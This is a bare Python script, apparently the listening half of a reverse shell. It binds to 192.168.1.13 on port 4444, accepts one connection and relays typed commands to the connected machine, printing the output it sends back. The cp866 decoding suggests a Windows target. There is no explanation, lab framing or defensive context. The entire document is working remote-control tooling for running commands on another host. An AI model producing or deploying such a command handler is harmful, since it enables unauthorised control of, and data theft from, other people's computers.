import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

host = '192.168.1.13'
port = 4444

s.bind((host, port))

s.listen(0)
print("Waiting...") 
conn, addr = s.accept()
print("[+] Connect " + str(addr))

while True:
	command = input("#> ")
	conn.send(command.encode())
	res = conn.recv(1024)
	res = str(res, "cp866")
	print(res)
